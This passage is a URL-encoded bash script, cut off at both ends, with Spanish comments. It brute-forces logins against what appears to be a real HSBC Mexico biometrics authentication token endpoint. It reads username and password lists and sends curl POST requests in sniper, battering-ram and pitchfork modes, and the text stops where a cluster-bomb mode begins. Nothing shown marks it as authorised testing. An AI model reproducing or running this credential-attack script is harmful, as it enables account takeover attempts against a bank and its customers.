ter_bomb%0ATARGET_URL%3D%22https%3A%2F%2Fbiometrics-fps.oat.mx.hsbc%2Ffpc-api%2Fauth%2Ftoken%22%0ALIST1%3D%22users.txt%22%0ALIST2%3D%22passwords.txt%22%0A%0Acase%20%24MODE%20in%0A%20%20%22sniper%22)%0A%20%20%20%20%23%20Un%20solo%20payload%2C%20una%20posici%C3%B3n%20a%20la%20vez%0A%20%20%20%20echo%20%22%5B!%5D%20Mode%3A%20Sniper%22%0A%20%20%20%20for%20payload%20in%20%24(cat%20%24LIST1)%3B%20do%0A%20%20%20%20%20%20%20%20echo%20%22%5B%2B%5D%20Testing%3A%20%24payload%22%0A%20%20%20%20%20%20%20%20curl%20-s%20-X%20POST%20%22%24TARGET_URL%22%20-d%20%22%7B%5C%22user%5C%22%3A%5C%22%24payload%5C%22%2C%5C%22pass%5C%22%3A%5C%22constante%5C%22%7D%22%0A%20%20%20%20done%0A%20%20%20%20%3B%3B%0A%0A%20%20%22battering_ram%22)%0A%20%20%20%20%23%20Un%20solo%20payload%20puesto%20en%20todas%20las%20posiciones%20simult%C3%A1neamente%0A%20%20%20%20echo%20%22%5B!%5D%20Mode%3A%20Battering%20Ram%22%0A%20%20%20%20for%20payload%20in%20%24(cat%20%24LIST1)%3B%20do%0A%20%20%20%20%20%20%20%20echo%20%22%5B%2B%5D%20Testing%3A%20%24payload%20%2F%20%24payload%22%0A%20%20%20%20%20%20%20%20curl%20-s%20-X%20POST%20%22%24TARGET_URL%22%20-d%20%22%7B%5C%22user%5C%22%3A%5C%22%24payload%5C%22%2C%5C%22pass%5C%22%3A%5C%22%24payload%5C%22%7D%22%0A%20%20%20%20done%0A%20%20%20%20%3B%3B%0A%0A%20%20%22pitchfork%22)%0A%20%20%20%20%23%20M%C3%BAltiples%20listas%20en%20paralelo%20(L%C3%ADnea%201%20con%20L%C3%ADnea%201)%0A%20%20%20%20echo%20%22%5B!%5D%20Mode%3A%20Pitchfork%22%0A%20%20%20%20exec%203%3C%24LIST1%0A%20%20%20%20exec%204%3C%24LIST2%0A%20%20%20%20while%20read%20-u%203%20p1%20%26%26%20read%20-u%204%20p2%3B%20do%0A%20%20%20%20%20%20%20%20echo%20%22%5B%2B%5D%20Sync%3A%20%24p1%3A%24p2%22%0A%20%20%20%20%20%20%20%20curl%20-s%20-X%20POST%20%22%24TARGET_URL%22%20-d%20%22%7B%5C%22user%5C%22%3A%5C%22%24p1%5C%22%2C%5C%22pass%5C%22%3A%5C%22%24p2%5C%22%7D%22%0A%20%20%20%20done%0A%20%20%20%20%3B%3B%0A%0A%20%20%22cluster_bomb%22)%0A%20%20%20%20%23%20Producto%20cartesiano%20(Todas%20las%20combinaciones%20posibles)%0A%20%20%20%20